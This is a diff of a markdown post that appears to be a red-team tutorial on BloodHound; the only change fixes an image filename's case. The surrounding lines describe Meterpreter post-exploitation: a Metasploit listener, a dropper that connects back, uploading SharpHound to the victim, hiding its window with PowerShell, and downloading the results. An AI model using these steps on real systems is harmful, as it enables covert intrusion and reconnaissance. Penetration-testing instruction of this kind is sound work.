@@ -26,7 +26,7 @@ Then, we'll host a listener through Metasploit with the ```multi/handler```.
 ![Meterpreter](/assets/img/bloodhound/meterpreter-listener.png)
 
 Once started, we're ready for the staged dropper to connect back and start our session. Upload Sharphound to the victim through ```upload SharpHound.exe``` and run it with ```execute -f SharpHound.exe```. This will start a new process and pop a very obvious shell window on the victim machine that shows Sharphound executing.
-![SharpHound](/assets/img/bloodhound/running-SharpHound.png)
+![SharpHound](/assets/img/bloodhound/running-sharpHound.png)
 This can be hidden by first dropping into a shell with ```shell``` and then running SharpHound through ```PowerShell.exe -WindowStyle hidden C:\Users\matt\Downloads\SharpHound.exe```. Finally, grab the output from Sharphound which is a zip file with ```download <filename>```.
 
 ### What info is gleaned?
